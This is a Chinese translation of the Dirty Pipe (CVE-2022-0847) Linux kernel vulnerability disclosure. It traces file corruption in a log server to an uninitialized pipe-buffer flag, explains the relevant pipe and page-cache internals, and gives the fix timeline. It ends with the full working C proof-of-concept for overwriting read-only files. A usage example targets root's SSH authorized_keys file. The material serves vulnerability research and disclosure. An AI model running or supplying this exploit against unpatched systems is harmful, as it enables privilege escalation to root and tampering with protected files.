# Dirty Pipe 漏洞

Max Kellermann <[max.kellermann@ionos.com](mailto:max.kellermann@ionos.com)>

## 摘要

 **本篇文章主要是关于CVE-2022-0847漏洞，CVE-2022-0847漏洞是出现在Linux内核为5.8之后的版本**
，该漏洞（是允许将任意只读文件覆盖）能够 **允许只读文件的数据被覆盖** 。利用这个漏洞可以
**让无特权的进程能够注入代码到root进程来得到权限提升。**

该漏洞和CVE-2016-5195 脏牛漏洞“Ditry Cow”类似，但是更加容易利用来进行爆破。该漏洞在Linux 5.16.11，5.15.25 和
5.10.102的版本 **已经被修复了** 。

## 现象 pt.1

事情开始于一年前一次关于文件损坏的客户服务。一位客户抱怨下载下来访问日志没办法解压。确实，一个日志服务器上面有一份损坏的文件；文件能够被解压，但是gzip会报CRC（循环冗余校验）错误。我当时也不知道该如何解释这个显现，但是我猜测可能是每天的文件切分进程造成文件的损坏。我手动修复了文件的CRC校验，然后完成了这次客户服务，然后就忘了这个事情。

几个月之后，这种情况发生了一次，然后现在又发生了。文件的内容每次都看着似乎都是正确的，只是文件最后的CRC是报错的。现在，手头有了几份损坏的文件，我开始深入的研究这个奇怪的文件损坏现象。新的模式出现了。

## 访问日志

先简单的介绍先日志服务器的工作流程：在CM4all的环境下，所有的web服务器（运行定制的开源HTTP服务器）发送包含每次HTTP请求报文的元数据的UDP多播报文。这些报文被发送到运行Pond数据库的的日志服务器（Pond是客制化的开源内存数据库）。将所有前一天的访问日志根据运行的不同网站来进行分开，然后用zlib来进行压缩。

通过HTTP，一整个月所有的访问日志可以当作一个`.gz`文件来进行下载。我用一个小技巧不用解压和重新压缩来直接将整个文件进行拼接。意味着整个HTTP请求过程基本完全不需要消耗CPU资源。通过系统调用splice()将数据直接从硬盘传输到HTTP连接以节省内存带宽的使用，不需要将数据发送到内核/用户空间（“0复制”）

Windows用户没法处理`.gz`文件，但是都能将ZIP文件解压。Zip文件只是`.gz`文件的容器，所以我们可以使用同样的方法来生成ZIP文件而不需要经过额外的步骤。我所需要做的是首先发送一个ZIP文件头，然后将所有的`.gz`文件内容进行连结，后面接到中央目录（另一种形式的文件头）。

## 现象 pt.2

一个正常的文件尾部是长这样的：

    
    
    000005f0  81 d6 94 39 8a 05 b0 ed  e9 c0 fd 07 00 00 ff ff
    00000600  03 00 9c 12 0b f5 f7 4a  00 00
    

数据中的`00 00 ff ff`是同步刷新数据，能够简单的讲文件进行拼接。`03 00`代表最终的文件块，后面跟着的是 CRC32
(`0xf50b129c`) 和未压缩的文件长度 (`0x00004af7`= 19191 bytes)。

同样的文件，但是被损坏过的是下面这个样子：

    
    
    000005f0  81 d6 94 39 8a 05 b0 ed  e9 c0 fd 07 00 00 ff ff
    00000600  03 00 50 4b 01 02 1e 03  14 00
    

同步刷新数据是正常的，最终块的数据也是正常的，但是未经压缩的文件长度数据变成了`0x0014031e`= 1.3
MB（应该是和上面的文件一样的大小为19kb，而不是1.3MB）。CRC32数据变成了`0x02014b51`，这数据和文件内容是不相符的。为什么呢？是因为文件写出边界了还是日志客户端出现了堆损坏bug。

我对比了下我所知道的所有的文件损坏情况，出乎意料的发现，所有的都CRC32都是相同的，而且文件长度数据也都是一样的。文件的CRC永远相同，这就意味着这种情况可能不可能是因为CRC计算的问题。损坏的数据能够看到不同的CRC值。我盯着代码看了好几个小时，但是就是解释不了这个情况。

然后我看着下面的这8个字节，然后我发现，`50 4b`是ASCII码中的“P“和”K“，”PK“是所有的ZIP文件的头部开始代码，我们看下面这8个字节

    
    
    50 4b 01 02 1e 03 14 00
    

`50 4b`是”PK“

`01 02`是中央目录文件头的代码

”压缩程序版本“ =`1e 03`;`0x1e`=30(3.0)；`0x03`= Unix

”解压程序版本“ =`14 00`;`0x0014`=20(2.0)

后面的数据丢失了，很明显的是文件头中的8个字节后面的数据被截断了。

这些确实是ZIP中央目录文件的头部数据，肯定不是巧合。但是。写这些文件的进程中没有能够生成这种头部数据的代码。我都绝望了，我查看了zlib的源文件代码和其他那个进程调用过的库文件但是什么都没发现。这部分程序对于”PK“头部完全没有任何关系。

这些都说不通，新的客户服务一直出现（频率比较低）。有些系统方面的问题，但是我就是没法把心放在上面。这搞得我很沮丧，但是我还在忙其他的任务，所以只能把这档子事一直往后推。

## 现象 pt.3

外部的原因让我由把这个问题放到我眼前，我花了两天时间扫描了整个损坏的文件的硬盘，希望能够有什么成果，确实，发现了一些蛛丝马迹。

> 在过去3个月出现了37分损坏的文件
>
> 这写文件损坏的情况出现在过去22个不同的日子
>
> 其中的18天只有1份文件损坏
>
> 其中有1天是2份文件损坏
>
> 其中有1天是7份文件损坏
>
> 其中有1天是6份文件损坏
>
> 其中有1天是4份文件损坏

每月的最后几天明显是发生文件损坏事件最多的日子

只有主日志服务器（用于HTTP连接服务和生成ZIP文件的服务器）会发生文件损坏的事情。备用的服务器（HTTP服务未激活，但是运行同样的日志文件生成进程）并没有出现文件损坏，两台服务器上面的数据都是不一样的，所以很容易区分。

这会不会是因为硬件已损坏导致的呢？或者是内存坏了？又或者是磁盘坏了？还是因为射线的缘故呢？根据现象来看，应该不会是因为硬件的问题导致的。该不会是机器里面有鬼吧，可能需要驱鬼了。

### 盯着代码

这次，我又开始盯着web服务的代码看。

我记得web服务写入一个ZIP头，然后用调用splice()发送压缩文件，最后再给”中央目录文件头“调用write()，这个文件头就是以`50 4b 01
02 1e 03 14
00`开始的。也就文件损坏的地方。发送过来的数据和硬盘上损坏的文件的数据一模一样。但是进行对这些数据发送的进程并没有对文件的写权限（而且也并没有试图修改的行为出现），只不过是读文件而已。除开所有的这些情况和不可能，肯定是这个进程导致的文件损坏，但是这是怎么发生的呢？

我的每一次有所启发总是会在每个月的月底，也就是文件损坏的时间。当网站管理员下载访问日志的时候，服务器就开始下个月的第一天，如此往复，当然，每月最后几天的日志是再最后发送的，最后一天的数据后面是有”PK“文件头的。很有可能就是这个原因导致的最后几天的文件损坏。（其他时候也有可能因为当月还没结束就情趣文件的话也有可能发生，但是可能性不大）

咋搞的呢？

### 盯内核代码

在卡了很久，排除了其他的情况肯定是不可能的之后（在我看来），我得出了个结论，肯定是内核的bug。

怪Linux内核损坏文件肯定的是最后的猜测了，可能性真的很小。内核可是几千个人用了一大堆的方法开发出来的及其复杂的工程；虽然如此，但是却是非常的稳定和可靠的。不过这次，我说服我自己确定就是内核的bug导致的。

我在闲暇的时候，曾黑过两个C编译的程序。

其中一个持续的往文件里面写入一大段奇怪的的”AAAAA“的字符串（模拟日志文件分割器）

    
    
    #include <unistd.h>
    int main(int argc, char **argv) {
      for (;;) write(1, "AAAAA", 5);
    }
    // ./writer >foo
    

另一个程序持续的通过splice()函数将文件中的数据传送到管道，然后将字符串”BBBBB“写入到管道。

    
    
    #define _GNU_SOURCE
    #include <unistd.h>
    #include <fcntl.h>
    int main(int argc, char **argv) {
      for (;;) {
        splice(0, 0, 1, 0, 2, 0);
        write(1, "BBBBB", 5);
      }
    }
    // ./splicer <foo |cat >/dev/null
    

我将这两个程序复制到了日志服务器...
bingo！(神了！)那个”BBBBB“的字符串出现在了文件里面，尽管根本没有人将这些字符串往文件里面写（只有一个只读权限的进程的管道）

所以说，这确定就是一个内核的bug了！

当这些过程能被复现的时候，所有的bug突然就变成了很明显了。快速检查了下，确认这个bug存在于Linux5.10（Debian
Bullseye），但是Linux 4.19（Debian
Buster）并没有这个bug。在4.19版和5.10版Linux之间的的git代码仓库里面一共有185.011个提交的代码，不过还是感谢`git
bisect`让我就花了17个步骤就锁定了出现bug代码。

出现bug的代码是在
[f6dd975583bd](https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958),这部分代码让匿名管道缓存重构了管道缓存代码，这个过程改变了给管道检查是否能够合并的方法。

### 管道、缓冲和页

怎么就是管道呢？在我们的检查过程中，生成了ZIP文件的web服务与web服务器通过管道进行通信；使用web程序套接字进行发送接收数据，之所以使用web程序套接字是因为不喜欢使用CGI，FastCGI和AJP。使用管道，而不是多路套接字（比如FastCGI和AJP）的优势在于：能够在应用程序和web服务两边都可以调用`splice()`从而达到效率最大化。这样的话能够减少web应用程序进程外的系统开销（和在web服务器进程里面跑web服务相反，比如像Apache模块），而且这样能够在不牺牲性能的情况下实现权限分离。

Linux
内存管理的大概思路是：CPU能够管理的最小内存单元叫做页（通常大小为4KB）。Linux内存管理中最底层的所有的单元都是和pages有关。如果一个应用程序向内核请求内存，内核会向应用程序发送（匿名）页的号码。所有的I/O也是以页为基础：当你阅读一个文件的数据，内核首先会从硬盘复制一个4kb的块的序列号到内核的内存。管理这个序列号的子系统叫做页高速缓存器。

然后，数据会被拷贝到用户空间。在页中的复制的数据会在缓存中停留一会，这时候还能被使用，可以避免非必要的硬盘读写。直到内核觉得这些数据不需要用了，要将这块内存另作他用（内存回收）。页高速缓冲器管理能系统调用mmap()直接将页映射到用户空间，而不用将文件数据拷贝到用户空间内存（以增加页面错误和
TLB 刷新为代价来减少内存带宽）。

Linux内核还有很多其他的”技巧“：比如，用`sendfile()`能够让应用程序不需要将文件内容数据发送到用户空间就直接发送到套接字（比较受欢迎的一种为通过HTTP提供静态文件的web服务器的优化方法）。通过系统调用`splice()`

在文件传送的任何一端是个管道的情况下，不管另一端是任何一种方式（管道、文件、套接字、块设备又或者是字符设备）它都能达到相同优化能力。内核是通过传递页引用来达到发送文件的目的，而不是真的进行复制（零拷贝）。

管道是用来单向进程间通讯的一种工具。管道的一段将数据进行推送，另一端进行拉取。Linux内核通过环形结构管道缓冲区来实现管道功能。每一个管道都引用到一个页。第一次写入到管道会分配一个页（大小为4kb）。如果最近的写操作没有完全的写满这个页，接下来的写入操作可能会直接添加到已经存在的管道中进行执行，而不是分配一个新的管道。而这就是”匿名“管道缓冲的工作原理。

然而，如果你用`splice()`将文件拼接到管道中的话，内核首先会将数据加载到页高速缓冲器中，然后创建一个`struct
pipe_buffer`缓存指向页高速缓冲器里面（零拷贝），但是不会像匿名管道缓存一样，额外要写入到管道的数据不能直接添加到这样的页上面，因为页是由页高速缓冲器所有，而不是管道所有。

检查新数据是否直接添加到已存在的管道缓存的记录：

> Long ago,`struct pipe_buf_operations`had a flag called`can_merge`.
>
> [Commit 5274f052e7b3 “Introduce sys_splice() system call” (Linux 2.6.16,
> 2006)](https://github.com/torvalds/linux/commit/5274f052e7b3dbd81935772eb551dfd0325dfa9d)featured
> the`splice()`system call, introducing`page_cache_pipe_buf_ops`, a`struct
> pipe_buf_operations`implementation for pipe buffers pointing into the page
> cache, the first one with`can_merge=0`(not mergeable).
>
> [Commit 01e7187b4119 “pipe: stop using ->can_merge” (Linux 5.0,
> 2019)](https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4)converted
> the`can_merge`flag into a`struct pipe_buf_operations`pointer comparison
> because only`anon_pipe_buf_ops`has this flag set.
>
> [Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops” (Linux 5.8,
> 2020)](https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958)converted
> this pointer comparison to per-buffer flag`PIPE_BUF_FLAG_CAN_MERGE`.

这么多年过去之后，重构了这份检查单。

### 未初始化的

在几年前，当`PIPE_BUF_FLAG_CAN_MERGE`还没有出现的时候， [commit 241699cd72a8 “new iov_iter
flavour: pipe-backed” (Linux 4.9,
2016)](https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b)这份commit添加了两个函数，这个函数能够分配新的`struct
pip_buffer`，但是对`flags`成员的初始化却没了。现在，可以通过任意的flags来创建页高速缓存的引用，不过这道是没关系。这算是一个技术性的bug而已，因为所有存在的flags都是相当无趣，当时也没有造成任何不良影响。

这个bug突然在Linux 5.8上在提交 [commit f6dd975583bd “pipe: merge
anon_pipe_buf*_ops”](https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958)之后变得相当严重。通过将`PIPE_BUF_FLAG_CAN_MERGE`注入到页高速缓存的调用里面，仅仅通过用特别的方式将准备好的数据写入到管道，就能够改写页高速缓冲的数据。

## 现象 pt.4

解释下文件损坏的情况：首先，某些数据被写入到管道，然后很多的数据被分片，创建一个页高速缓存调用。可能这些可能有页可能没有设置`PIPE_BUF_FLAG_CAN_MERGE`这个函数。如果有，则`write()`将中央目录文件的头部写入到最后压缩的文件的页文件高速缓存里面。

但是为什么只是在文件头的初始的8字节呢？事实上，所有的文件头部都被复制到了页高速缓存中去了，但是这个操作并没有扩大文件的大小。源文件在尾部只有8字节的未拼接空间，然后只有这些空间能够被改写。从页高速缓存器的角度来说其他的页并没有被使用（虽然管道缓存代码使用了，但是他有自己的页管理系统）。

为啥这情况不是经常出现呢？因为除非页高速缓存器觉得这个页”dirty“，不然不会写回到硬盘。通常在页缓存器改写的数据并不”dirty”，如果没有其他的进程将文件搞“drity”，而且这种变化是非常短暂的；在下一次重启之后（又或者内核决定丢弃缓存中的页的时候，也就是内存压力下重新回收）这种改变会被恢复的。这种情况能够让黑客攻击你且在硬盘上不留下任何痕迹。

## 利用

在我的第一次利用时（我曾用来二分的那个“writer”/”splicer“程序），我假设这个bug只有当特权进程写入文件的时候才会发生，而且还要看时机来说成功与否。

当我意识到真正的问题是，我能够通过大量的写入来将这个bug扩大：甚至能够在没有写入进程的情况下改写页文件缓存，没有时间限制，可以在任何地方写入任何数据：

> 攻击者必须有文件的阅读权限（因为需要将page调用`splice()`连结到管道）
>
> 偏移必须在page边界上（因为最少要包含这个页内的一个字节来被分割进入管道）
>
> 写入必须不能跨过页边界（因为如果过多的话会创建一个新的匿名缓存）
>
> 文件大小不能够调整（因为管道是有自己的页管理器而且并不会和页缓存器沟通传送的数据的大小）

要利用这个漏洞，你需要：

> 创建一个管道
>
> 将管道用任意代码填满（要将`PIPE_BUF_FLAG_CAN_MERGE`的flag填满环条目）
>
> 排净管道中的数据（将`struct pip_inode_info`环上所有的`struct pipe_buffer`保持标志集）
>
> 将目标文件（用`O_RDONLY`打开)中的数据分割发送到管道中目标偏移之前的位置。
>
> 将任意数据写入到管道，因为`PIPE_BUF_FLAG_CAN_MERGE`的设定，这些数据将会重写文件页的缓存，而不是创建一个新的匿名`strcut
> pipe_buffer﻿`

为了让这个漏洞更加有意思，使得不仅不需要写权限，甚至不可变文件，只读的btrfs快照，和只读的挂载文件（包括CD-ROM挂载）。因为页高速缓存是（内核）持续可写的，并且写入到管道时甚至都不需要权限。

下面是POC：

    
    
    /* SPDX-License-Identifier: GPL-2.0 */
    /*
     * Copyright 2022 CM4all GmbH / IONOS SE
     *
     * author: Max Kellermann <max.kellermann@ionos.com>
     *
     * Proof-of-concept exploit for the Dirty Pipe
     * vulnerability (CVE-2022-0847) caused by an uninitialized
     * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
     * file contents in the page cache, even if the file is not permitted
     * to be written, immutable or on a read-only mount.
     *
     * This exploit requires Linux 5.8 or later; the code path was made
     * reachable by commit f6dd975583bd ("pipe: merge
     * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
     * there before, it just provided an easy way to exploit it.
     *
     * There are two major limitations of this exploit: the offset cannot
     * be on a page boundary (it needs to write one byte before the offset
     * to add a reference to this page to the pipe), and the write cannot
     * cross a page boundary.
     *
     * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
     *
     * Further explanation: https://dirtypipe.cm4all.com/
     */
    
    #define _GNU_SOURCE
    #include <unistd.h>
    #include <fcntl.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/stat.h>
    #include <sys/user.h>
    
    #ifndef PAGE_SIZE
    #define PAGE_SIZE 4096
    #endif
    
    /**
     * Create a pipe where all "bufs" on the pipe_inode_info ring have the
     * PIPE_BUF_FLAG_CAN_MERGE flag set.
     */
    static void prepare_pipe(int p[2])
    {
    	if (pipe(p)) abort();
    
    	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    	static char buffer[4096];
    
    	/* fill the pipe completely; each pipe_buffer will now have
    	   the PIPE_BUF_FLAG_CAN_MERGE flag */
    	for (unsigned r = pipe_size; r > 0;) {
    		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    		write(p[1], buffer, n);
    		r -= n;
    	}
    
    	/* drain the pipe, freeing all pipe_buffer instances (but
    	   leaving the flags initialized) */
    	for (unsigned r = pipe_size; r > 0;) {
    		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    		read(p[0], buffer, n);
    		r -= n;
    	}
    
    	/* the pipe is now empty, and if somebody adds a new
    	   pipe_buffer without initializing its "flags", the buffer
    	   will be mergeable */
    }
    
    int main(int argc, char **argv)
    {
    	if (argc != 4) {
    		fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
    		return EXIT_FAILURE;
    	}
    
    	/* dumb command-line argument parser */
    	const char *const path = argv[1];
    	loff_t offset = strtoul(argv[2], NULL, 0);
    	const char *const data = argv[3];
    	const size_t data_size = strlen(data);
    
    	if (offset % PAGE_SIZE == 0) {
    		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
    		return EXIT_FAILURE;
    	}
    
    	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    	const loff_t end_offset = offset + (loff_t)data_size;
    	if (end_offset > next_page) {
    		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
    		return EXIT_FAILURE;
    	}
    
    	/* open the input file and validate the specified offset */
    	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
    	if (fd < 0) {
    		perror("open failed");
    		return EXIT_FAILURE;
    	}
    
    	struct stat st;
    	if (fstat(fd, &st)) {
    		perror("stat failed");
    		return EXIT_FAILURE;
    	}
    
    	if (offset > st.st_size) {
    		fprintf(stderr, "Offset is not inside the file\n");
    		return EXIT_FAILURE;
    	}
    
    	if (end_offset > st.st_size) {
    		fprintf(stderr, "Sorry, cannot enlarge the file\n");
    		return EXIT_FAILURE;
    	}
    
    	/* create the pipe with all flags initialized with
    	   PIPE_BUF_FLAG_CAN_MERGE */
    	int p[2];
    	prepare_pipe(p);
    
    	/* splice one byte from before the specified offset into the
    	   pipe; this will add a reference to the page cache, but
    	   since copy_page_to_iter_pipe() does not initialize the
    	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    	--offset;
    	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    	if (nbytes < 0) {
    		perror("splice failed");
    		return EXIT_FAILURE;
    	}
    	if (nbytes == 0) {
    		fprintf(stderr, "short splice\n");
    		return EXIT_FAILURE;
    	}
    
    	/* the following write will not create a new pipe_buffer, but
    	   will instead write into the page cache, because of the
    	   PIPE_BUF_FLAG_CAN_MERGE flag */
    	nbytes = write(p[1], data, data_size);
    	if (nbytes < 0) {
    		perror("write failed");
    		return EXIT_FAILURE;
    	}
    	if ((size_t)nbytes < data_size) {
    		fprintf(stderr, "short write\n");
    		return EXIT_FAILURE;
    	}
    
    	printf("It worked!\n");
    	return EXIT_SUCCESS;
    }
    

## 时间线

2021-04-29：第一次关于文件损坏的客户服务

2022-02-19：确定文件损坏的问题时由于内核的bug导致，并由发现该漏洞可利用

2022-02-20：报告bug，将爆破和补丁发送给[Linux内核安全团队](https://www.kernel.org/doc/html/latest/admin-guide/security-bugs.html)

2022-02-21：在谷歌Pixel 6 上发现该bug，bug报告发送给安卓安全团队

2022-02-21: 根据Linus Tovalds, Willy Tarreau和Ai Virology的建议，将补丁发送给LKML（不包括漏洞细节）

2022-02-23:包含bug修复的Linux稳定版发布([5.16.11](https://lore.kernel.org/stable/1645618039140207@kroah.com/),
[5.15.25](https://lore.kernel.org/stable/164561803311588@kroah.com/),
[5.10.102](https://lore.kernel.org/stable/164561802556115@kroah.com/))

2022-02-24：[谷歌将我的bug修复合并到了安卓内核](https://android-review.googlesource.com/c/kernel/common/+/1998671)

2022-02-28：提醒了Linux-distros讨论组

2022-03-07：公开披露

2022-03-09：翻译该文章

 **本人仅根据大佬发布的漏洞报告对全文进行翻译了下，如有错误请不吝赐教。**

